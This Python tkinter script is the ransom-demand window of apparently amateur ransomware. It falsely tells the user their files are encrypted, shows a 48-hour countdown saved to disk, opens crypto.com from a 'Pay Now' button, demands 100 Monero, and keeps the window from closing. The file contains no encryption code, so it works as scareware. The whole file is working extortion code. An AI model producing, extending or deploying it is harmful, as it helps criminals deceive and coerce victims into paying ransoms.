import tkinter as tk
from tkinter import messagebox
import time
import threading
import os
import webbrowser

class Window:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DarthVader")
        self.root.geometry("500x300")
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.thread = threading.Thread(target=self.countdown)
        self.thread.start()
        self.root.mainloop()

    def create_widgets(self):
        self.title_label = tk.Label(self.root, text="Ooops, your files have been encrypted!", font=("Helvetica", 16, "bold"))
        self.title_label.pack(pady=10)

        self.message_label = tk.Label(self.root, text="What happened to my computer?\n\nAll your files have been encrypted due to a security problem with your PC.\nIf you want to restore them, you need to pay.\n\nIf you don't pay the key for decrypt will be deleted", justify="left")
        self.message_label.pack(pady=10)

        self.time_label = tk.Label(self.root, text="Tiempo restante: 48:00:00", font=("Helvetica", 14))
        self.time_label.pack(pady=10)

        self.pay_button = tk.Button(self.root, text="Pay Now", command=self.pay_now, font=("Helvetica", 14), bg="red", fg="white")
        self.pay_button.pack(pady=20)

    def countdown(self):
        total_seconds = self.load_time_remaining()
        while total_seconds > 0:
            hours, remainder = divmod(total_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            time_format = f"{hours:02}:{minutes:02}:{seconds:02}"
            self.time_label.config(text=f"Tiempo restante: {time_format}")
            self.root.update()
            time.sleep(1)
            total_seconds -= 1
            self.save_time_remaining(total_seconds)
        self.on_closing()

    def load_time_remaining(self):
        if os.path.exists("time_remaining.txt"):
            with open("time_remaining.txt", "r") as file:
                return int(file.read().strip())
        else:
            return 48 * 60 * 60

    def save_time_remaining(self, total_seconds):
        with open("time_remaining.txt", "w") as file:
            file.write(str(total_seconds))

    def pay_now(self):
        #redirigir a la página de pago en línea crypto.com
        webbrowser.open("https://crypto.com")
        messagebox.showinfo("Payment", "Pay 100Monero(XMR) to my wallet(WALLET) to decrypt your files")

    def on_closing(self):
        if messagebox.askokcancel("Salir", "You can't close the window. You need to pay to decrypt your files."):
            pass

if __name__ == "__main__":
    window = Window()